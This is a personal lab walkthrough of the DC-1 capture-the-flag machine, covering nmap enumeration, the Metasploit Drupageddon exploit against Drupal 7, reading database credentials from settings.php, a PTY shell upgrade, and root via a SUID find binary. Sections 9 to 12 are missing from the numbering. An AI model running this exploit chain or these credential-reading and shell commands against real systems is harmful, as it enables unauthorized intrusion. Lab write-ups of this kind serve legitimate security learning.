# DC-1 Walkthrough — From Initial Enumeration to Root

**Date:** 14 September 2026  
**Lab:** DC-1  
**Purpose:** Practice web enumeration, exploitation, credential discovery, database access, and Linux privilege escalation in an authorized vulnerable lab.

> **Note:** This is my personal learning documentation. I removed/redacted sensitive lab information such as IP addresses, passwords, password hashes, cron keys, and flag values. The commands and reasoning are kept so I can understand the attack chain later.

---

## 1. Network Discovery

I started by finding the machines available on my lab network.

```bash
sudo netdiscover
```

### Why I did this

Before attacking anything, I need to know **which machine is the target**.

Think of it like looking around a neighborhood before visiting a particular house. `netdiscover` helps identify the devices that are present on the local network.

I identified the DC-1 machine and used its IP as `<TARGET_IP>` in the commands below.

---

## 2. Scan the Target

After finding the target, I scanned it with Nmap.

```bash
nmap -A -sV <TARGET_IP>
```

### Why I did this

I wanted to know:

- Which ports are open
- What services are running
- What versions are being used
- What operating system the machine appears to be running

The important result was:

```text
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
```

Nmap also identified:

```text
http-generator: Drupal 7
```

So the main attack surface was the **Drupal website running on HTTP port 80**.

---

## 3. Confirm Drupal

I checked the website directly:

```bash
curl -s http://<TARGET_IP> | head -30
```

The HTML contained:

```html
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
```

### Why I checked this

Nmap already suggested Drupal 7, but I wanted to confirm it from the actual web application's response.

The page also showed Drupal components such as:

```text
sites/all/modules/views/
sites/all/modules/ctools/
```

This confirmed that the target was running a Drupal 7 installation.

---

## 4. Find a Suitable Drupal Exploit

Inside Metasploit, I searched for Drupal modules:

```text
search drupal
```

One of the relevant results was:

```text
exploit/multi/http/drupal_drupageddon
```

I selected it:

```text
use exploit/multi/http/drupal_drupageddon
```

### Why I chose this

The target was clearly a Drupal web application, and this exploit targets vulnerable Drupal 7 installations.

At this point I did not need to attack SSH or other services because the web application was the obvious attack surface.

I configured the target:

```text
set RHOSTS <TARGET_IP>
```

Then I ran the exploit:

```text
run
```

The exploit successfully opened a Meterpreter session on the target.

---

## 5. Get a Shell

From Meterpreter:

```text
shell
```

I checked who I was:

```bash
whoami
```

The result was:

```text
www-data
```

### What this means

`www-data` is the account commonly used by web servers on Linux.

So I had gained **code execution on the server**, but I was not root yet.

My situation was:

```text
Web application
      ↓
Drupal exploit
      ↓
www-data
      ↓
Need to find a way to become root
```

---

## 6. Find the First Flag Clue

I listed the Drupal web directory:

```bash
ls
```

Among the files was:

```text
flag1.txt
```

I read it:

```bash
cat flag1.txt
```

The flag contained a clue about a **configuration file**.

### My reasoning

Drupal has a `sites` directory, and Drupal site-specific configuration is normally stored under:

```text
sites/default/
```

So instead of randomly searching the whole filesystem, I followed the clue.

---

## 7. Find the Drupal Configuration

I checked:

```bash
ls sites
```

I found:

```text
default
```

Then:

```bash
ls -la sites/default
```

The important file was:

```text
settings.php
```

I inspected it:

```bash
cat sites/default/settings.php
```

### Why this was important

`settings.php` contains the configuration Drupal needs to connect to its database.

I found database connection information there, including:

- Database type
- Database host
- Database name
- Database username
- Database password

**I am not including the actual credentials here.**

This was an important lesson:

> Configuration files can contain credentials and other information that attackers can reuse.

## 8. Access the Database

The MySQL client was available:

```bash
mysql --version
```

However, the normal MySQL login was not working correctly through the basic Meterpreter shell because it was not providing a proper interactive terminal.

So I created a pseudo-terminal using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

I then connected to MySQL using the credentials discovered in `settings.php`:

```bash
mysql -u <DB_USER> -p
```

After entering the database password locally, I received:

```text
mysql>
```

### Why the Python command mattered

Some interactive programs need a proper terminal.

Meterpreter's basic shell was not behaving like a normal terminal, so MySQL's password prompt was being interpreted incorrectly.

The Python PTY gave me a proper interactive Bash terminal.

## 13. Return to Local Privilege Escalation

Although I had administrator access to Drupal, my Linux shell was still:

```text
www-data
```

My goal was now to get root access.

I checked the local users:

```bash
cat /etc/passwd
```

### Why I checked `/etc/passwd`

After getting a shell, one of the things I need to understand is:

> **Who are the users on this machine?**

The file lists local user accounts and information such as their UID, home directory, and login shell.

One interesting entry was:

```text
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```

This told me that a user called `flag4` existed and had a home directory at:

```text
/home/flag4
```

---

## 14. Find Flag 4

I checked the directory:

```bash
ls -la /home/flag4
```

I saw:

```text
flag4.txt
```

Its permissions allowed other users to read it.

So, even though I was `www-data`, I could read it:

```bash
cat /home/flag4/flag4.txt
```

The file gave me the next clue: I needed to find a way to access something belonging to root.

---

## 15. Check for SUID Binaries

Since `/root` was not accessible as `www-data`, I looked for local privilege-escalation opportunities.

I searched for SUID files:

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Why this command?

The important part is:

```text
-perm -4000
```

`4000` represents the **SUID bit**.

A SUID executable runs with the privileges of its file owner.

If a file is:

```text
root-owned + SUID
```

then running it can potentially cause a normal user to execute something with root's effective privileges.

The search returned:

```text
/usr/bin/find
```

That immediately stood out.

---

## 16. Confirm the SUID Permission

I checked:

```bash
ls -la /usr/bin/find
```

The result showed:

```text
-rwsr-xr-x 1 root root ... /usr/bin/find
```

The important part is:

```text
rws
```

instead of the normal:

```text
rwx
```

The `s` means the SUID bit is enabled.

So I had:

```text
/usr/bin/find
Owner: root
SUID: enabled
```

This meant `find` could potentially run commands with an effective UID of root.

---

## 17. Use SUID `find` for Privilege Escalation

I used the SUID `find` binary:

```bash
find . -exec /bin/sh \; -quit
```

A new shell opened.

I checked:

```bash
whoami
```

The result was:

```text
root
```

I then checked:

```bash
id
```

The important result was:

```text
uid=33(www-data) gid=33(www-data) euid=0(root)
```

### What `euid=0` means

Linux uses UID `0` for root.

So:

```text
uid=33(www-data)
```

means my original user was still `www-data`.

But:

```text
euid=0(root)
```

means the process had **root's effective privileges**.

That was enough to access `/root`.

# What I Learned

### 1. Enumeration comes first

I didn't start by blindly attacking services. I first found the target and identified what was running.

### 2. Configuration files can be extremely valuable

The Drupal `settings.php` file contained database connection information. A configuration file that looks harmless can contain credentials.

### 3. Credential reuse can provide another level of access

The database information led me to the Drupal user database and eventually to the administrator account.

### 4. `/etc/passwd` is useful for local enumeration

It showed me what users existed on the Linux system and helped me discover the `flag4` account.

### 5. File permissions matter

`flag4.txt` was readable by my current user even though it belonged to `flag4`.

### 6. SUID is important for privilege escalation

The SUID search revealed that `/usr/bin/find` was owned by root and had SUID enabled.

### 7. `find` can execute commands

Because `find` had root's effective privileges, its `-exec` functionality allowed me to obtain a shell with effective UID 0.

### 8. I should follow the clues

The biggest lesson from this machine was not just learning individual commands.

It was learning to think:

```text
What did I just discover?
Why is it interesting?
What does the clue suggest?
What should I check next?
```

That is much more useful than memorizing an exploit chain.
